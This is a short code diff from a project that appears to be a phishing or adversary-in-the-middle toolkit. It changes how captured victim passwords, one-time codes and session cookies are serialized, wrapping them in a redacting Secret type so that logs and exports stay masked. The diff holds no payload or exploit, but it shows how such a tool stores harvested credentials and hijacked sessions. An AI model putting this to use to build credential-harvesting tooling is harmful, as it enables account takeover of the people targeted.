@@ -910,12 +910,19 @@ def _open_dict(o: OpenEvent) -> Dict[str, Any]:
 
 
 def _cred_dict(c: CredCapture) -> Dict[str, Any]:
-    return {"ip": c.ip, "username": c.username, "password": c.password,
-            "otp": c.otp, "time": c.time}
+    # P1-10: the raw values are wrapped in the non-persistible Secret type —
+    # any generic serialization (json.dumps, logs, exports) renders only the
+    # mask. `craft hits <code>` is the LIVE operator surface and unwraps
+    # explicitly; every persisted copy stays redacted.
+    from phantom.utils.redact import Secret
+    return {"ip": c.ip, "username": c.username, "password": Secret(c.password),
+            "otp": Secret(c.otp), "time": c.time}
 
 
 def _session_dict(s: Any) -> Dict[str, Any]:
-    return {"ip": s.ip, "username": s.username, "cookies": s.cookies,
+    # AiTM session cookies ARE the authenticated browser — non-persistible too
+    from phantom.utils.redact import Secret
+    return {"ip": s.ip, "username": s.username, "cookies": Secret(s.cookies),
             "ua": s.user_agent, "time": s.time}
 
 
